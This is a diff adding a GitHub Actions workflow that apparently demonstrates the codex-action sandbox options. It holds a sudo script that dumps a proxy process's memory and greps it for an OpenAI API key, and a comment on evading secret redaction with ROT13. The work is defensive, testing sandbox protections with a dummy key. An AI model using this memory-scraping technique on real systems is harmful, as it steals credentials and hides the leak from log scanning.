@@ -1,0 +1,66 @@
+# This example demonstrates the importance of using `drop-sudo` or `read-only`
+# safety strategies to prevent exfiltration of sensitive data like API keys.
+
+name: Test sandbox protections
+on:
+  workflow_dispatch:
+
+jobs:
+  assess-exfiltration-risk:
+    runs-on: ubuntu-latest
+    strategy:
+      fail-fast: false
+      matrix:
+        safety-strategy:
+          # `drop-sudo` is the default `safety-strategy`, which prevents the
+          # malicious behavior allowed by the other strategies in this example.
+          - drop-sudo
+          # `read-only` cannot write files or talk to the network, but as we
+          # will see, it still allows some dangerous operations.
+          - read-only
+          - unsafe
+    steps:
+      - uses: actions/checkout@v5
+
+      - name: Run Codex (${{ matrix.safety-strategy }})
+        uses: openai/codex-action@main
+        with:
+          # An OpenAI API key often starts with `sk-proj-` and is followed
+          # by random characters matching [A-Za-z-0-9_-].
+          openai-api-key: sk-proj-abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ
+          safety-strategy: ${{ matrix.safety-strategy }}
+
+      - name: Try to dump the key from the codex-responses-api-proxy process
+        run: |
+          # Find the PID for the codex-responses-api-proxy process.
+          SERVER_INFO_FILE="$HOME/.codex/${{ github.run_id }}.json"
+          PID=$(jq .pid < "$SERVER_INFO_FILE")
+
+          # Using standard filesystem read operations (albeit privileged ones),
+          # try to dump the memory of the process to disk to search for the key.
+          sudo bash -s -- "$PID" <<'SCAN_MEM'
+          pid="$1"
+          mem="/proc/$pid/mem"
+          i=0
+          while read -r rng perms _; do
+            [[ $perms != r* ]] && continue
+            start=$((0x${rng%-*}))
+            end=$((0x${rng#*-}))
+            dd if="$mem" of="/tmp/$pid-$i.bin" bs=4096 iflag=skip_bytes,count_bytes \
+               skip="$start" count="$((end - start))" status=none || true
+            i=$((i + 1))
+          done < "/proc/$pid/maps"
+          SCAN_MEM
+
+          # Use ordinary grep to search for the key pattern in the dumped memory files.
+          matches=$(grep -aPo '(?<![A-Za-z0-9_-])sk-proj-[A-Za-z0-9_-]+(?![A-Za-z0-9_-])' /tmp/${PID}-*.bin | sort -u)
+          if [ -n "$matches" ]; then
+            # Note that if `openai-api-key` was read from a GitHub secret, the
+            # secret scanning feature would redact it from logs, but this
+            # could easily be circumvented by using a toy cipher like ROT13:
+            # https://en.wikipedia.org/wiki/ROT13.
+            echo "Potential leaks found:"
+            printf '%s\n' "$matches"
+          else
+            echo "No leaks found"
+          fi
